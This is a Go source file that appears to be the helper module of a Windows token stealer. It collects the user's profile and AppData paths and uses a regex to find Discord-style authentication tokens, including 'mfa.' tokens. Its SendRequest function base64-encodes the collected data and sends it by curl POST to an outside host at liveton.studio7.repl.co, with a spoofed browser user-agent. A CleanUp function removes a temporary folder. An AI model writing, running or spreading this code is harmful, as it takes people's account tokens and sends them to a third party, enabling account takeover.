package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"regexp"
	"strings"
	"time"
)

const (
	numberBytes string = "0123456789"
	letterBytes string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

var (
	USER string = GetUsername()

	LOCAL    string = os.Getenv("LOCALAPPDATA")
	ROAMING  string = os.Getenv("APPDATA")
	TEMP     string = os.Getenv("TEMP")
	PERSONAL string = os.Getenv("USERPROFILE")

	HEADERS [999]string
)

type SysInfo struct {
	Hostname string
	Platform string
	CPU      string
	RAM      uint64
	Disk     uint64
}

func CleanUp() {
	_ = os.RemoveAll(TempFileDir)
}

func SendRequest(body string) {

	var encoded_payload string = strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(body)), "=", "")

	exec.Command("curl",
		//"-H", "Host: liveton.studio7.repl.co",
		//"-H", "upgrade-insecure-request: 1",
		//"-H", "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		//"-H", "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		//"-H", "sec-gpc: 1",
		//"-H", "accept-language: en-US,en;q=0.5",
		//"-H", "sec-fetch-site: none",
		//"-H", "sec-fetch-mode: navigate",
		//"-H", "sec-fetch-user: ?1",
		//"-H", "sec-fetch-dest: document",
		//"--compressed",
		"--location",
		"--request",
		"POST",
		"https://liveton.studio7.repl.co/go",
		"--header", "Content-Type: application/x-www-form-urlencoded",
		"--header", "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"--data-urlencode", "id="+encoded_payload).Start()

	//	this is the post version // you should

	/*
		curl --location --request POST 'https://liveton.studio7.repl.co/go' \
		--header 'Content-Type: application/x-www-form-urlencoded' \
		--data-urlencode 'id=SHITGOESHERE'
	*/

	//exec.Command("curl",
	//	"--location",
	//	"--request", "POST",
	//	"'https://liveton.studio7.repl.co/go'",
	//	"-H", "'Content-Type: application/x-www-form-urlencoded'",
	//	"--data-urlencode", "'id=" + encoded_payload + "'")

}

func GetUsername() string {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	if strings.Contains(user.Username, "\\") {
		return strings.Split(user.Username, "\\")[1]
	} else {
		return user.Username
	}
}

func FindAllTokens(input string) []string {
	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})|(mfa\\.[\\w-]{84})")
	if e != nil {
		log.Fatalf(e.Error())
	}

	return Expression.FindAllString(input, -1)
}

func RemoveDuplicates[T string | int](sliceList []T) []T {
	allKeys := make(map[T]bool)
	list := []T{}
	for _, item := range sliceList {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}

func FormatTokens(input []string) string {
	output, _ := json.Marshal(RemoveDuplicates(input))
	return string(output)
}

func Slice(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}

func RandStringBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func RandIntBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = numberBytes[rand.Intn(len(numberBytes))]
	}
	return string(b)
}

func GenerateHeaders() {
	for i := 0; i < len(HEADERS); i++ {
		HEADERS[i] = RandIntBytes(6)
	}
}

func ToString(s interface{}) string {
	return fmt.Sprint(s)
}
